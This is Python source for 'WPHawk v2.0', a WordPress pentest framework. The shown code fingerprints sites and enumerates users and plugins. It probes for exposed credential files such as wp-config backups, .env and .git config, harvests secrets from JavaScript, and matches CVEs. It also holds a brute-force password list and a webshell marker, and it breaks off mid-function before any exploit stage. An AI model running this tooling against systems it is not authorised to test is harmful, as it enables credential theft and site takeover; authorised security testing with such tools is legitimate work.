#!/usr/bin/env python3
"""
WPHawk v2.0 — Advanced WordPress Pentest Framework
Zero API keys. Recon · Enum · JS Analysis · REST Discovery ·
CVE Intel · Version-aware Vuln Matching · Exploitation · Auth Scan
"""

import asyncio
import aiohttp
import json
import re
import argparse
import random
import os
import sys
import time
import hashlib
from urllib.parse import urljoin, urlparse
from dataclasses import dataclass, field

# ─────────────────────────────────────────────────────────────────────────────
# DEPENDENCY CHECK
# ─────────────────────────────────────────────────────────────────────────────
try:
    import aiosqlite
except ImportError:
    print("[!] Missing dependency: pip install aiosqlite")
    sys.exit(1)

# ─────────────────────────────────────────────────────────────────────────────
# COLORS
# ─────────────────────────────────────────────────────────────────────────────
class C:
    GREEN  = '\033[92m'
    YELLOW = '\033[93m'
    RED    = '\033[91m'
    BLUE   = '\033[94m'
    CYAN   = '\033[96m'
    BOLD   = '\033[1m'
    DIM    = '\033[2m'
    RESET  = '\033[0m'

def g(s):    return f"{C.GREEN}{s}{C.RESET}"
def y(s):    return f"{C.YELLOW}{s}{C.RESET}"
def r(s):    return f"{C.RED}{s}{C.RESET}"
def b(s):    return f"{C.BLUE}{s}{C.RESET}"
def dim(s):  return f"{C.DIM}{s}{C.RESET}"
def bold(s): return f"{C.BOLD}{s}{C.RESET}"

def rand_ua():
    return random.choice(USER_AGENTS)

def hdr(extra=None):
    h = {"User-Agent": rand_ua()}
    if extra:
        h.update(extra)
    return h

def info(msg):  print(f"  {b('[~]')} {msg}")
def ok(msg):    print(f"  {g('[+]')} {msg}")
def warn(msg):  print(f"  {y('[!]')} {msg}")
def err(msg):   print(f"  {r('[✗]')} {msg}")
def pwn(msg):   print(f"  {g(bold('[PWNED]'))} {msg}")
def fail(msg):  print(f"  {dim('[FAIL]')} {msg}")

def section(title):
    print(f"\n{bold('━━━ ' + title + ' ━━━')}")

def _strip_ansi(s):
    return re.sub(r'\033\[[0-9;]*m', '', s)

# ─────────────────────────────────────────────────────────────────────────────
# USER AGENTS
# ─────────────────────────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 Version/17.4.1 Safari/605.1.15",
]

# ─────────────────────────────────────────────────────────────────────────────
# BUILT-IN WORDLISTS
# ─────────────────────────────────────────────────────────────────────────────
BUILTIN_PLUGINS = [
    "contact-form-7","woocommerce","elementor","yoast-seo","wordfence",
    "jetpack","akismet","wpforms-lite","classic-editor","really-simple-ssl",
    "all-in-one-seo-pack","updraftplus","mailchimp-for-wp","redirection",
    "limit-login-attempts-reloaded","wp-super-cache","w3-total-cache",
    "ninja-forms","advanced-custom-fields","wp-smushit","duplicator",
    "all-in-one-wp-migration","wp-file-manager","litespeed-cache","autoptimize",
    "rank-math","tinymce-advanced","tablepress","wp-mail-smtp",
    "wpml-multilingual-cms","polylang","wp-optimize","broken-link-checker",
    "metaslider","revolution-slider","essential-addons-for-elementor",
    "ocean-extra","generatepress","beaver-builder-plugin","siteground-optimizer",
    "cookie-notice","google-analytics-for-wordpress","loginizer",
    "user-role-editor","members","wp-fastest-cache","hummingbird-performance",
    "defender-security","404-to-301","easy-wp-smtp","wp-statistics",
    "insert-headers-and-footers","classic-widgets","simple-custom-post-order",
    "wp-sitemap-page","the-events-calendar","tribe-common","bbpress","buddypress",
    "woocommerce-pdf-invoices-packing-slips","woocommerce-gateway-stripe",
    "wpml-string-translation","gravityforms","gravity-forms",
]

BUILTIN_THEMES = [
    "twentytwentyfour","twentytwentythree","twentytwentytwo","twentytwentyone",
    "twentytwenty","twentynineteen","astra","oceanwp","generatepress",
    "hello-elementor","storefront","divi","avada","bridge","flatsome",
    "salient","enfold","jupiter","the7","newspaper","publisher","jannah",
    "sahifa","soledad","betheme","porto","woodmart","uncode","impreza",
    "total","kallyas","beaverbuilder-theme",
]

BUILTIN_PASSWORDS = [
    "admin","password","123456","admin123","wordpress","letmein","qwerty",
    "111111","abc123","password1","iloveyou","sunshine","princess","dragon",
    "master","login","welcome","shadow","1234","12345","123456789","pass",
    "test","admin1","administrator","root","toor","pass123","changeme",
    "default","pass1234","wordpress123","wp123","webmaster","hosting",
    "server","localhost","secret","admin@123","P@ssword","P@ssw0rd",
    "password123","Password1","Admin123","Welcome1","Summer2024","Winter2024",
    "Spring2024","Autumn2024","company123","secure123","test123","hello",
    "hello123","guest","guest123","user","user123","backup","backup123",
    "support","qwerty123","abc1234","superman","batman","monkey","football",
    "2024","2023","1234567","12345678","1234567890","pass@123","admin@2024",
]

WP_SENSITIVE_FILES = [
    "wp-config.php.bak","wp-config.php~","wp-config.php.old","wp-config.php.orig",
    "wp-config.bak",".wp-config.php.swp","wp-config.php.save","wp-config.php.txt",
    "readme.html","license.txt","wp-content/debug.log",".git/HEAD",".git/config",
    "wp-admin/install.php","wp-admin/setup-config.php","error_log",".env",
    "phpinfo.php","info.php","wp-cron.php","wp-content/uploads/.htaccess",
    ".htpasswd","backup.zip","backup.sql","db.sql","database.sql","dump.sql",
    "wp-content/backups/","wp-content/uploads/wpforms/",".DS_Store","thumbs.db",
]

SECURITY_HEADERS = [
    "Strict-Transport-Security","X-Frame-Options","X-Content-Type-Options",
    "Content-Security-Policy","Referrer-Policy","Permissions-Policy","X-XSS-Protection",
]

# Patterns for JS secret extraction
JS_SECRET_PATTERNS = {
    "API Key":          re.compile(r'(?:api[_-]?key|apikey)\s*[=:]\s*["\']([A-Za-z0-9_\-]{16,})["\']', re.I),
    "Secret":           re.compile(r'(?:secret|token|password|passwd|pwd)\s*[=:]\s*["\']([A-Za-z0-9_\-!@#$%]{8,})["\']', re.I),
    "AWS Key":          re.compile(r'AKIA[0-9A-Z]{16}'),
    "Bearer Token":     re.compile(r'Bearer\s+([A-Za-z0-9\-._~+/]+=*)'),
    "WP Nonce":         re.compile(r'nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']', re.I),
    "Email":            re.compile(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+'),
    "AJAX Endpoint":    re.compile(r'(?:ajaxurl|ajax_url)\s*[=:]\s*["\']([^"\']+)["\']', re.I),
    "Hardcoded URL":    re.compile(r'https?://[^\s"\'<>{}\[\]]+', re.I),
    "WP Action":        re.compile(r'action["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{4,})["\']', re.I),
}

WEBSHELL_MARKER = hashlib.md5(b"wphawk_pwned_v2").hexdigest()

# ─────────────────────────────────────────────────────────────────────────────
# DATACLASSES
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class CVEEntry:
    cve_id: str
    cvss_score: float
    severity: str
    description: str
    published: str
    references: list
    exploit_available: bool
    exploit_db_id: str
    exploit_url: str
    source: str
    fixed_in: str = ""        # version where this CVE was fixed
    is_patched: bool = False  # True if detected version >= fixed_in

@dataclass
class PluginEntry:
    slug: str
    version: str
    detected_by: str
    readme_url: str
    asset_type: str           # plugin | theme
    latest_version: str = ""  # from WP.org API
    is_outdated: bool = False
    last_updated: str = ""
    cves: list = field(default_factory=list)
    vulnerable_cves: list = field(default_factory=list)   # CVEs where version < fixed_in
    exploited: bool = False
    exploit_results: list = field(default_factory=list)

@dataclass
class UserEntry:
    id: int
    name: str
    slug: str
    detected_by: str
    password: str = ""

@dataclass
class ExploitResult:
    plugin_slug: str
    cve_id: str
    exploit_type: str
    success: bool
    evidence: str
    payload_used: str

@dataclass
class JsFinding:
    js_url: str
    finding_type: str
    value: str

@dataclass
class RestEndpoint:
    route: str
    methods: list
    auth_required: bool
    response_preview: str

@dataclass
class ScanResult:
    target_url: str
    is_wordpress: bool = False
    wp_version: str = ""
    wp_version_sources: list = field(default_factory=list)
    plugins: list = field(default_factory=list)
    themes: list = field(default_factory=list)
    users: list = field(default_factory=list)
    sensitive_files: list = field(default_factory=list)
    xmlrpc_accessible: bool = False
    xmlrpc_multicall: bool = False
    registration_open: bool = False
    directory_listing: bool = False
    wpcron_exposed: bool = False
    security_headers: dict = field(default_factory=dict)
    wp_core_cves: list = field(default_factory=list)
    exploit_results: list = field(default_factory=list)
    errors: list = field(default_factory=list)
    server_info: dict = field(default_factory=dict)
    # v2.0 additions
    js_findings: list = field(default_factory=list)
    rest_endpoints: list = field(default_factory=list)
    robots_paths: list = field(default_factory=list)
    sitemap_urls: list = field(default_factory=list)
    subdomains: list = field(default_factory=list)
    outdated_plugins: list = field(default_factory=list)  # refs to outdated PluginEntry objects

# ─────────────────────────────────────────────────────────────────────────────
# UTILITIES
# ─────────────────────────────────────────────────────────────────────────────
def normalize_url(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    p = urlparse(url)
    base = f"{p.scheme}://{p.netloc}{p.path}"
    if not base.endswith("/"):
        base += "/"
    return base

def version_lt(v1, v2):
    """Return True if v1 < v2 as semantic version."""
    if not v1 or not v2:
        return False
    try:
        def parts(v):
            return [int(x) for x in re.split(r'[.\-]', str(v)) if x.isdigit()]
        p1, p2 = parts(v1), parts(v2)
        while len(p1) < len(p2): p1.append(0)
        while len(p2) < len(p1): p2.append(0)
        return p1 < p2
    except Exception:
        return False

def version_gte(v1, v2):
    return not version_lt(v1, v2)

def cvss_to_severity(score):
    if score >= 9.0: return "CRITICAL"
    if score >= 7.0: return "HIGH"
    if score >= 4.0: return "MEDIUM"
    return "LOW"

def severity_tag(sev, score=None):
    score_str = f" {score}" if score else ""
    tags = {
        "CRITICAL": r(f"[CRITICAL{score_str}]"),
        "HIGH":     r(f"[HIGH{score_str}]"),
        "MEDIUM":   y(f"[MEDIUM{score_str}]"),
        "LOW":      dim(f"[LOW{score_str}]"),
    }
    return tags.get(sev, f"[{sev}]")

def load_wordlist(path):
    if not path:
        return None
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    except FileNotFoundError:
        warn(f"Wordlist not found: {path} — using built-in")
        return None

def print_banner():
    print(f"""
{C.CYAN}{C.BOLD}╔══════════════════════════════════════════════════════╗
║  WPHawk v2.0 — WordPress Pentest Framework          ║
║  Recon · JS · REST · CVE · Version Match · Exploit  ║
╚══════════════════════════════════════════════════════╝{C.RESET}""")

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 1 — FINGERPRINTING
# ─────────────────────────────────────────────────────────────────────────────
async def fetch_homepage(session, base_url, timeout=30):
    try:
        async with session.get(base_url, headers=hdr(), timeout=timeout, allow_redirects=True) as resp:
            text = await resp.text(errors="replace")
            return text, resp
    except Exception:
        return "", None

async def detect_wordpress(session, result, html, resp):
    if resp is None:
        result.errors.append("Could not connect to target")
        return False
    x_gen   = resp.headers.get("X-Generator", "")
    x_power = resp.headers.get("X-Powered-By", "")
    final   = str(resp.url)
    signals = [
        bool(re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']WordPress', html, re.I)),
        "wp-content/" in html,
        "wp-includes/" in html,
        "WordPress" in x_gen,
        "WordPress" in x_power,
        "wp-login.php" in html,
        "/wp-json/" in html,
    ]
    if any(signals):
        result.is_wordpress = True
        if "wp-login.php" in final:
            warn("Target redirected to wp-login.php — may require authentication")
        return True
    err("Target does not appear to be WordPress")
    return False

async def detect_wp_version(session, result, html):
    async def _gen(html):
        m = re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']WordPress\s*([\d.]+)', html, re.I)
        return (m.group(1) if m else None), "generator meta tag"

    async def _readme(session, base):
        try:
            async with session.get(urljoin(base, "readme.html"), headers=hdr(), timeout=10) as r:
                if r.status == 200:
                    t = await r.text(errors="replace")
                    m = re.search(r'Version\s*([\d.]+)', t, re.I)
                    return (m.group(1) if m else None), "readme.html"
        except Exception:
            pass
        return None, "readme.html"

    async def _rss(session, base):
        try:
            async with session.get(urljoin(base, "?feed=rss2"), headers=hdr(), timeout=10) as r:
                if r.status == 200:
                    t = await r.text(errors="replace")
                    m = re.search(r'<generator>[^<]*?v=([\d.]+)<', t)
                    if not m:
                        m = re.search(r'WordPress/([\d.]+)', t)
                    return (m.group(1) if m else None), "RSS feed"
        except Exception:
            pass
        return None, "RSS feed"

    async def _license(session, base):
        try:
            async with session.get(urljoin(base, "license.txt"), headers=hdr(), timeout=10) as r:
                if r.status == 200:
                    t = await r.text(errors="replace")
                    m = re.search(r'WordPress\s*-[^\n]*\n.*?Version\s*([\d.]+)', t, re.I | re.S)
                    return (m.group(1) if m else None), "license.txt"
        except Exception:
            pass
        return None, "license.txt"

    async def _assets(html):
        vers = re.findall(r'wp-includes/[^"\'?]+\?ver=([\d.]+)', html)
        if vers:
            from collections import Counter
            v = Counter(vers).most_common(1)[0][0]
            return v, "enqueued assets ?ver="
        return None, "assets"

    items = await asyncio.gather(
        _gen(html), _readme(session, result.target_url),
        _rss(session, result.target_url), _license(session, result.target_url),
        _assets(html), return_exceptions=True
    )
    for item in items:
        if isinstance(item, Exception):
            continue
        ver, src = item
        if ver:
            if not result.wp_version:
                result.wp_version = ver
            if src not in result.wp_version_sources:
                result.wp_version_sources.append(src)

async def detect_server_info(session, result, resp):
    if resp is None:
        return
    h = resp.headers
    cf  = h.get("CF-RAY", "")
    suc = h.get("X-Sucuri-ID", "")
    wf  = h.get("X-Wordfence-Cache", "")
    result.server_info = {
        "server": h.get("Server", "Unknown"),
        "php":    h.get("X-Powered-By", "Unknown"),
        "waf":    "Cloudflare" if cf else "Sucuri" if suc else "Wordfence" if wf else "None detected",
    }

async def check_security_headers(session, result):
    try:
        async with session.get(result.target_url, headers=hdr(), timeout=15) as resp:
            for h in SECURITY_HEADERS:
                result.security_headers[h] = resp.headers.get(h)
    except Exception as e:
        result.errors.append(f"Header check failed: {e}")

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 2 — ENUMERATION
# ─────────────────────────────────────────────────────────────────────────────
def _parse_version_from_readme(text):
    m = re.search(r'(?:Stable tag|Version)\s*:\s*([\d.]+)', text, re.I)
    return m.group(1) if m else None

def passive_enum_plugins(html, result):
    slugs = set(re.findall(r'wp-content/plugins/([a-zA-Z0-9_-]+)/', html))
    seen  = {p.slug for p in result.plugins}
    for slug in slugs:
        if slug in seen:
            continue
        m = re.search(rf'wp-content/plugins/{re.escape(slug)}/[^"\']*\?ver=([\d.]+)', html)
        result.plugins.append(PluginEntry(
            slug=slug, version=(m.group(1) if m else ""),
            detected_by="passive", readme_url=None, asset_type="plugin"
        ))

def passive_enum_themes(html, result):
    slugs = set(re.findall(r'wp-content/themes/([a-zA-Z0-9_-]+)/', html))
    seen  = {t.slug for t in result.themes}
    for slug in slugs:
        if slug in seen:
            continue
        m = re.search(rf'wp-content/themes/{re.escape(slug)}/[^"\']*\?ver=([\d.]+)', html)
        result.themes.append(PluginEntry(
            slug=slug, version=(m.group(1) if m else ""),
            detected_by="passive", readme_url=None, asset_type="theme"
        ))

async def _probe_slug(session, base_url, slug, asset_type, delay, sem):
    async with sem:
        url = urljoin(base_url, f"wp-content/{asset_type}s/{slug}/readme.txt")
        try:
            await asyncio.sleep(delay)
            async with session.get(url, headers=hdr(), timeout=12, allow_redirects=False) as resp:
                if resp.status == 200:
                    text = await resp.text(errors="replace")
                    return PluginEntry(slug=slug, version=_parse_version_from_readme(text) or "",
                                       detected_by="aggressive", readme_url=url, asset_type=asset_type)
                if resp.status == 403:
                    return PluginEntry(slug=slug, version="", detected_by="aggressive",
                                       readme_url=url, asset_type=asset_type)
        except Exception:
            pass
    return None

async def aggressive_enum_plugins(session, result, wordlist, delay, concurrency):
    slugs    = wordlist or BUILTIN_PLUGINS
    sem      = asyncio.Semaphore(concurrency)
    existing = {p.slug for p in result.plugins}
    counter  = [0]

    async def run(slug):
        e = await _probe_slug(session, result.target_url, slug, "plugin", delay, sem)
        counter[0] += 1
        if counter[0] % 100 == 0:
            info(f"Plugin probes: {counter[0]}/{len(slugs)}")
        return e

    entries = await asyncio.gather(*[run(s) for s in slugs], return_exceptions=True)
    for e in entries:
        if not isinstance(e, PluginEntry):
            continue
        if e.slug in existing:
            for p in result.plugins:
                if p.slug == e.slug:
                    if not p.version and e.version:
                        p.version = e.version
                    p.detected_by = "passive+aggressive"
        else:
            result.plugins.append(e)

async def aggressive_enum_themes(session, result, wordlist, delay, concurrency):
    slugs    = wordlist or BUILTIN_THEMES
    sem      = asyncio.Semaphore(concurrency)
    existing = {t.slug for t in result.themes}
    counter  = [0]

    async def run(slug):
        e = await _probe_slug(session, result.target_url, slug, "theme", delay, sem)
        counter[0] += 1
        if counter[0] % 50 == 0:
            info(f"Theme probes: {counter[0]}/{len(slugs)}")
        return e

    entries = await asyncio.gather(*[run(s) for s in slugs], return_exceptions=True)
    for e in entries:
        if not isinstance(e, PluginEntry):
            continue
        if e.slug in existing:
            for t in result.themes:
                if t.slug == e.slug:
                    if not t.version and e.version:
                        t.version = e.version
                    t.detected_by = "passive+aggressive"
        else:
            result.themes.append(e)

async def _users_rest(session, base):
    users = []
    try:
        async with session.get(urljoin(base, "wp-json/wp/v2/users?per_page=100"), headers=hdr(), timeout=15) as r:
            if r.status == 200:
                for u in await r.json(content_type=None):
                    users.append(UserEntry(id=u.get("id",0), name=u.get("name",""),
                                           slug=u.get("slug",""), detected_by="rest_api"))
            elif r.status in (401,403):
                info("REST API user endpoint is protected")
    except Exception:
        pass
    return users

async def _users_author(session, base, max_id):
    users = []
    for i in range(1, max_id+1):
        try:
            async with session.get(urljoin(base, f"?author={i}"), headers=hdr(),
                                   timeout=10, allow_redirects=False) as r:
                loc = r.headers.get("Location","")
                m   = re.search(r'/author/([^/?#]+)/?', loc)
                if m:
                    slug = m.group(1)
                    users.append(UserEntry(id=i, name=slug.replace("-"," ").title(),
                                           slug=slug, detected_by="author_redirect"))
        except Exception:
            pass
    return users

async def enumerate_users(session, result, max_id=20):
    ra, au = await asyncio.gather(
        _users_rest(session, result.target_url),
        _users_author(session, result.target_url, max_id),
        return_exceptions=True
    )
    seen = set()
    for lst in [ra, au]:
        if isinstance(lst, list):
            for u in lst:
                if u.slug not in seen:
                    seen.add(u.slug)
                    result.users.append(u)

async def check_sensitive_files(session, result):
    async def probe(path):
        try:
            async with session.get(urljoin(result.target_url, path), headers=hdr(),
                                   timeout=12, allow_redirects=False) as r:
                if r.status in (200, 403):
                    return {"path": path, "url": urljoin(result.target_url, path), "status": r.status}
        except Exception:
            pass
        return None
    items = await asyncio.gather(*[probe(p) for p in WP_SENSITIVE_FILES], return_exceptions=True)
    result.sensitive_files = [i for i in items if isinstance(i, dict)]

async def check_xmlrpc(session, result):
    url = urljoin(result.target_url, "xmlrpc.php")
    try:
        async with session.get(url, headers=hdr(), timeout=12) as r:
            if r.status == 200 and "XML-RPC" in await r.text(errors="replace"):
                result.xmlrpc_accessible = True
    except Exception:
        return
    if not result.xmlrpc_accessible:
        return
    xml = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
    try:
        async with session.post(url, data=xml, headers=hdr({"Content-Type":"text/xml"}), timeout=12) as r:
            text = await r.text(errors="replace")
            if "system.multicall" in text or "wp.getUsersBlogs" in text:
                result.xmlrpc_multicall = True
    except Exception:
        pass

async def check_open_registration(session, result):
    try:
        url = urljoin(result.target_url, "wp-login.php?action=register")
        async with session.get(url, headers=hdr(), timeout=12) as r:
            t = await r.text(errors="replace")
            if r.status == 200 and ("user_login" in t or "user_email" in t):
                result.registration_open = True
    except Exception:
        pass

async def check_directory_listing(session, result):
    try:
        url = urljoin(result.target_url, "wp-content/uploads/")
        async with session.get(url, headers=hdr(), timeout=12) as r:
            t = await r.text(errors="replace")
            if r.status == 200 and ("Index of" in t or "Parent Directory" in t):
                result.directory_listing = True
    except Exception:
        pass

async def check_wp_cron(session, result):
    try:
        url = urljoin(result.target_url, "wp-cron.php?doing_wp_cron")
        async with session.get(url, headers=hdr(), timeout=12) as r:
            if r.status == 200:
                result.wpcron_exposed = True
    except Exception:
        pass

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 2.5 — DEEP RECON (--deep-recon)
# ─────────────────────────────────────────────────────────────────────────────
async def analyze_js_files(session, result, html):
    """Extract all enqueued JS URLs, fetch each, scan for secrets & endpoints."""
    info("Analyzing JavaScript files...")
    js_urls = list(set(re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html, re.I)))
    # Normalize to absolute URLs
    abs_urls = []
    for u in js_urls:
        if u.startswith("http"):
            abs_urls.append(u)
        elif u.startswith("//"):
            abs_urls.append("https:" + u)
        elif u.startswith("/"):
            parsed = urlparse(result.target_url)
            abs_urls.append(f"{parsed.scheme}://{parsed.netloc}{u}")
        else:
            abs_urls.append(urljoin(result.target_url, u))

    findings = []
    sem = asyncio.Semaphore(5)

    async def scan_js(js_url):
        async with sem:
            try:
                async with session.get(js_url, headers=hdr(), timeout=15) as r:
                    if r.status != 200:
                        return
                    text = await r.text(errors="replace")
                    for ftype, pattern in JS_SECRET_PATTERNS.items():
                        for match in pattern.findall(text):
                            value = match if isinstance(match, str) else match
                            # Skip obvious false positives
                            if len(value) < 4 or value in ("true","false","null","undefined"):
                                continue
                            findings.append(JsFinding(js_url=js_url, finding_type=ftype, value=value[:120]))
            except Exception:
                pass

    await asyncio.gather(*[scan_js(u) for u in abs_urls[:30]], return_exceptions=True)
    result.js_findings = findings
    ok(f"JS analysis: {len(abs_urls)} files scanned, {len(findings)} findings")

async def parse_robots_sitemap(session, result):
    """Parse robots.txt for Disallow paths and sitemap.xml for URLs."""
    base = result.target_url

    # robots.txt
    try:
        async with session.get(urljoin(base, "robots.txt"), headers=hdr(), timeout=12) as r:
            if r.status == 200:
                text = await r.text(errors="replace")
                for line in text.splitlines():
                    line = line.strip()
                    if line.lower().startswith("disallow:"):
                        path = line.split(":",1)[1].strip()
                        if path and path != "/":
                            result.robots_paths.append(path)
                ok(f"robots.txt: {len(result.robots_paths)} Disallow paths found")
    except Exception:
        pass

    # sitemap.xml
    sitemap_urls_to_try = ["sitemap.xml", "sitemap_index.xml", "wp-sitemap.xml"]
    for sm in sitemap_urls_to_try:
        try:
            async with session.get(urljoin(base, sm), headers=hdr(), timeout=12) as r:
                if r.status == 200:
                    text = await r.text(errors="replace")
                    urls = re.findall(r'<loc>([^<]+)</loc>', text)
                    result.sitemap_urls.extend(urls[:100])
                    ok(f"{sm}: {len(urls)} URLs extracted")
                    break
        except Exception:
            pass

async def discover_rest_endpoints(session, result):
    """Enumerate all WP REST API routes and flag unauthenticated ones."""
    info("Discovering REST API endpoints...")
    try:
        async with session.get(urljoin(result.target_url, "wp-json/"), headers=hdr(), timeout=15) as r:
            if r.status != 200:
                info("REST API root not accessible (may be disabled)")
                return
            data = await r.json(content_type=None)
            routes = data.get("routes", {})

            sem = asyncio.Semaphore(8)

            async def probe_route(route, info_dict):
                async with sem:
                    url = urljoin(result.target_url, f"wp-json{route}")
                    methods = list((info_dict.get("methods") or {}).keys()) if isinstance(info_dict, dict) else ["GET"]
                    auth_req = True
                    preview  = ""
                    try:
                        async with session.get(url, headers=hdr(), timeout=10) as rr:
                            if rr.status == 200:
                                auth_req = False
                                text = await rr.text(errors="replace")
                                preview = text[:80].replace("\n","")
                            elif rr.status in (401, 403):
                                auth_req = True
                    except Exception:
                        pass
                    return RestEndpoint(route=route, methods=methods,
                                        auth_required=auth_req, response_preview=preview)

            tasks = [probe_route(r, d) for r, d in list(routes.items())[:60]]
            endpoints = await asyncio.gather(*tasks, return_exceptions=True)
            result.rest_endpoints = [e for e in endpoints if isinstance(e, RestEndpoint)]

            unauthed = [e for e in result.rest_endpoints if not e.auth_required]
            ok(f"REST API: {len(result.rest_endpoints)} routes, {len(unauthed)} accessible without auth")
    except Exception as ex:
        info(f"REST API discovery error: {ex}")

async def enumerate_subdomains(session, result):
    """Enumerate subdomains via crt.sh SSL certificate transparency."""
    domain = urlparse(result.target_url).netloc
    info(f"Subdomain enum via crt.sh for {domain}...")
    try:
        url = f"https://crt.sh/?q=%.{domain}&output=json"
        async with session.get(url, headers=hdr(), timeout=25) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                seen = set()
                for entry in data:
                    for name in entry.get("name_value","").split("\n"):
                        name = name.strip().lstrip("*.")
                        if name and name not in seen and domain in name:
                            seen.add(name)
                            result.subdomains.append(name)
                ok(f"crt.sh: {len(result.subdomains)} subdomains found")
    except Exception as ex:
        info(f"crt.sh lookup failed: {ex}")

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 3 — CVE INTELLIGENCE + VERSION MATCHING
# ─────────────────────────────────────────────────────────────────────────────
DB_PATH   = os.path.join(os.path.dirname(os.path.abspath(__file__)), "wphawk_cve_cache.db")
CACHE_TTL = 48 * 3600

async def init_db():
    db = await aiosqlite.connect(DB_PATH)
    await db.execute("""CREATE TABLE IF NOT EXISTS cve_cache (
        cache_key TEXT PRIMARY KEY, data TEXT, cached_at REAL)""")
    await db.commit()
    return db

async def get_cached(db, key):
    async with db.execute("SELECT data, cached_at FROM cve_cache WHERE cache_key=?", (key,)) as cur:
        row = await cur.fetchone()
    if row and time.time() - row[1] < CACHE_TTL:
        return json.loads(row[0])
    return None

async def store_cached(db, key, data):
    await db.execute("INSERT OR REPLACE INTO cve_cache VALUES (?,?,?)",
                     (key, json.dumps(data), time.time()))
    await db.commit()

def _make_cve(cve_id, cvss, desc, published, refs, exploit_available=False,
              edb_id="", edb_url="", source="", fixed_in=""):
    score = float(cvss) if cvss else 0.0
    return {
        "cve_id": cve_id, "cvss_score": score, "severity": cvss_to_severity(score),
        "description": (desc or "")[:300], "published": published or "",
        "references": refs or [], "exploit_available": exploit_available,
        "exploit_db_id": edb_id or "", "exploit_url": edb_url or "",
        "source": source, "fixed_in": fixed_in, "is_patched": False,
    }

async def _lookup_nvd(session, slug):
    cves = []
    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=wordpress+{slug}&resultsPerPage=30"
    try:
        await asyncio.sleep(0.6)
        async with session.get(url, headers=hdr(), timeout=30) as r:
            if r.status != 200:
                return cves
            data = await r.json(content_type=None)
            for item in data.get("vulnerabilities", []):
                cve  = item.get("cve", {})
                cvid = cve.get("id","")
                cvss = 0.0
                for key in ("cvssMetricV31","cvssMetricV30","cvssMetricV2"):
                    arr = cve.get("metrics",{}).get(key,[])
                    if arr:
                        cvss = arr[0].get("cvssData",{}).get("baseScore", 0.0)
                        break
                desc = next((d["value"] for d in cve.get("descriptions",[]) if d.get("lang")=="en"), "")
                refs = [r2.get("url","") for r2 in cve.get("references",[])]
                if cvid and cvss > 0:
                    cves.append(_make_cve(cvid, cvss, desc, cve.get("published",""), refs, source="NVD"))
    except Exception:
        pass
    return cves

async def _lookup_github(session, slug):
    cves = []
    url = f"https://api.github.com/advisories?type=reviewed&per_page=50&query={slug}+wordpress"
    try:
        await asyncio.sleep(1.0)
        async with session.get(url, headers=hdr({"Accept":"application/vnd.github+json"}), timeout=20) as r:
            if r.status != 200:
                return cves
            for adv in await r.json(content_type=None):
                summary = adv.get("summary","")
                if slug.lower() not in summary.lower():
                    continue
                cvss_obj  = adv.get("cvss") or {}
                cvss      = cvss_obj.get("score", 5.0)
                cve_ids   = adv.get("cve_id") or []
                if isinstance(cve_ids, str):
                    cve_ids = [cve_ids]
                cve_id  = cve_ids[0] if cve_ids else adv.get("ghsa_id","")
                refs    = [r2.get("url","") for r2 in (adv.get("references") or [])]
                if cve_id:
                    cves.append(_make_cve(cve_id, cvss, summary, adv.get("published_at",""), refs, source="GitHub Advisory"))
    except Exception:
        pass
    return cves

async def _lookup_patchstack(session, slug):
    cves = []
    url = f"https://patchstack.com/database/wordpress/{slug}"
    try:
        async with session.get(url, headers=hdr(), timeout=20) as r:
            if r.status != 200:
                return cves
            html = await r.text(errors="replace")
            rows = re.findall(r'<tr[^>]*>(.*?)</tr>', html, re.S)
            for row in rows:
                cve_m   = re.search(r'CVE-(\d{4}-\d+)', row)
                cvss_m  = re.search(r'(\d+\.\d+)\s*/\s*10', row)
                fix_m   = re.search(r'(?:Fixed in|Patched in)\s*v?([\d.]+)', row, re.I)
                title_m = re.search(r'<td[^>]*>\s*([^<]{10,100}?)\s*</td>', row)
                if cve_m:
                    fixed_in = fix_m.group(1) if fix_m else ""
                    cves.append(_make_cve(
                        f"CVE-{cve_m.group(1)}", float(cvss_m.group(1)) if cvss_m else 5.0,
                        re.sub(r'<[^>]+>',"",title_m.group(1)).strip() if title_m else "",
                        "", [], source="Patchstack", fixed_in=fixed_in
                    ))
    except Exception:
        pass
    return cves

async def _lookup_exploitdb(session, slug):
    cves = []
    url = f"https://www.exploit-db.com/search?q=wordpress+{slug}&type=webapps&platform=php"
    try:
        async with session.get(url, headers=hdr({"Accept":"application/json,*/*"}), timeout=20) as r:
            if r.status != 200:
                return cves
            text = await r.text(errors="replace")
            edb_ids = re.findall(r'"id"\s*:\s*"?(\d+)"?', text)
            cve_ids = re.findall(r'(CVE-\d{4}-\d+)', text)
            titles  = re.findall(r'"title"\s*:\s*"([^"]+)"', text)
            for i, eid in enumerate(edb_ids[:10]):
                cve_id  = cve_ids[i] if i < len(cve_ids) else f"EDB-{eid}"
                title   = titles[i] if i < len(titles) else f"WordPress {slug} exploit"
